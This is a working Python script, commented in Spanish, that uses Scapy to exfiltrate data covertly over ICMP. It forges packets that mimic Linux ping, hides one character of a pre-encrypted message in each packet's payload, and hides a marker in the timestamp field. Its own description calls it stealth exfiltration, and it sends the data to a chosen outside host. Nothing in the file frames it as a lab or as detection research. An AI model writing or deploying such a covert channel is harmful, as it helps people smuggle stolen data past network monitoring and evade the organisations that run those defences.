#!/usr/bin/env python3
"""
Uso:
    sudo python3 ping.py "larycxpajorj h bnpdarmjm nw anmnb"
    sudo python3 ping.py "larycxpajorj h bnpdarmjm nw anmnb" --dest 8.8.8.8
"""

import sys
import time
import argparse
import os
import struct

try:
    from scapy.all import (
        IP, ICMP, Raw, send, sr1,
        conf, get_if_addr
    )
    from scapy.layers.inet import ICMP as ScapyICMP
except ImportError:
    print("[ERROR] Scapy no está instalado. Ejecutar: pip install scapy")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────────────────────
# Constantes que replica el ping de Linux (iputils) por defecto
# ──────────────────────────────────────────────────────────────────────────────
PING_TTL          = 64          # TTL por defecto en Linux
PING_DATA_SIZE    = 56          # bytes de data (sin contar 8B header ICMP)
PING_INTER_PAQUETE = 1.0        # segundos entre paquetes (igual que ping -i 1)
ICMP_TYPE_ECHO    = 8
ICMP_CODE         = 0

# Patrón de relleno que usa iputils ping:
# después del timestamp de 8 bytes, llena con 0x10..0x37 rotando

# Pre-shared secret — ambos extremos lo conocen
MAGIC = 0xC0DE   # 16 bits, puede ser cualquier valor acordado
def _build_ping_payload(seq: int, char: str) -> bytes:
    ts     = time.time()
    ts_sec = int(ts)
    ts_usec = int((ts - ts_sec) * 1_000_000)

    # ── Embeber MAGIC en los 16 bits bajos de ts_usec ──────────────────
    # Los bits altos conservan el tiempo real → sigue viéndose como usec válido
    ts_usec_magic = (ts_usec & ~0xFFFF) | MAGIC
    # ────────────────────────────────────────────────────────────────────

    timestamp = struct.pack("<qq", ts_sec, ts_usec_magic)  # 16 bytes

    fill = bytearray(range(0x10, 0x38))   # 40 bytes, patrón real intacto
    fill[0] = ord(char)                   # char oculto en data[16]
    return timestamp + bytes(fill)


def _build_icmp_packet(dest: str, pid: int, seq: int, char: str) -> IP:
    """Construye el paquete IP/ICMP completo imitando ping de Linux."""
    payload = _build_ping_payload(seq, char)
    pkt = (
        IP(dst=dest, ttl=PING_TTL) /
        ICMP(type=ICMP_TYPE_ECHO, code=ICMP_CODE, id=pid, seq=seq) /
        Raw(load=payload)
    )
    return pkt


def _print_packet_fields(pkt: IP, label: str = ""):
    """Imprime los campos relevantes del paquete para comparación."""
    icmp = pkt[ICMP]
    raw  = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else b""
    print(f"\n  {'─'*50}")
    print(f"  {label}")
    print(f"  {'─'*50}")
    print(f"  IP  src={pkt[IP].src:<15} dst={pkt[IP].dst:<15} ttl={pkt[IP].ttl} proto=ICMP")
    print(f"  ICMP type={icmp.type} (Echo Request)  code={icmp.code}  "
          f"id=0x{icmp.id:04x}  seq={icmp.seq}")
    print(f"  Data [{len(raw)} bytes]: "
          f"{raw[:8].hex(' ')} | {raw[8:16].hex(' ')} ...")
    char_byte = raw[16] if len(raw) > 16 else 0
    print(f"  Char embebido: 0x{char_byte:02x} = '{chr(char_byte)}'")


def send_stealth_ping(mensaje: str, dest: str = "8.8.8.8", verbose: bool = True):
    """Envía cada carácter del mensaje en un paquete ICMP independiente."""
    pid = os.getpid() & 0xFFFF   # ID de proceso (16 bits), igual que iputils

    conf.verb = 0   # silenciar scapy

    print(f"\n[*] Destino   : {dest}")
    print(f"[*] PID (ICMP id): 0x{pid:04x} ({pid})")
    print(f"[*] Mensaje   : '{mensaje}' ({len(mensaje)} chars)")
    print(f"[*] TTL       : {PING_TTL}")
    print(f"[*] Data size : {PING_DATA_SIZE} bytes\n")

    for seq, char in enumerate(mensaje, start=1):
        pkt = _build_icmp_packet(dest, pid, seq, char)

        if verbose:
            _print_packet_fields(pkt, f"PAQUETE #{seq}  char='{char}'  (antes de envío)")

        send(pkt)
        print(f".\nsent 1 packets.")

        if verbose and seq < len(mensaje):
            time.sleep(PING_INTER_PAQUETE)

    print(f"\n[✓] Transmisión completada: {len(mensaje)} paquetes enviados.")
    print(f"    Último carácter transmitido: '{mensaje[-1]}'")


# ──────────────────────────────────────────────────────────────────────────────
# Comparativa con ping real (captura un echo reply de referencia)
# ──────────────────────────────────────────────────────────────────────────────
def show_real_ping_reference(dest: str = "8.8.8.8"):
    """Envía un ping real y muestra sus campos para comparación."""
    print("\n" + "═"*56)
    print("  REFERENCIA: ping real (un solo paquete)")
    print("═"*56)
    pid  = os.getpid() & 0xFFFF
    conf.verb = 0
    ref  = IP(dst=dest, ttl=PING_TTL) / ICMP(id=pid, seq=0) / Raw(load=_build_ping_payload(0, '\x00'))
    resp = sr1(ref, timeout=2)
    _print_packet_fields(ref, "→ Echo Request enviado")
    if resp:
        print(f"\n  ← Echo Reply recibido (TTL={resp[IP].ttl})")
    else:
        print("\n  [!] Sin respuesta (posible firewall) — campos del request igualmente válidos")
    print("═"*56)


def main():
    parser = argparse.ArgumentParser(
        description="ping.py — Exfiltración stealth vía paquetes ICMP"
    )
    parser.add_argument("mensaje",              help="String a exfiltrar (ya cifrado)")
    parser.add_argument("--dest",  default="8.8.8.8", help="IP destino (default: 8.8.8.8)")
    parser.add_argument("--quiet", action="store_true", help="No mostrar campos de cada paquete")
    parser.add_argument("--ref",   action="store_true", help="Mostrar referencia ping real primero")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[ERROR] Este programa requiere privilegios root (sudo).")
        sys.exit(1)

    if args.ref:
        show_real_ping_reference(args.dest)

    send_stealth_ping(args.mensaje, dest=args.dest, verbose=not args.quiet)


if __name__ == "__main__":
    main()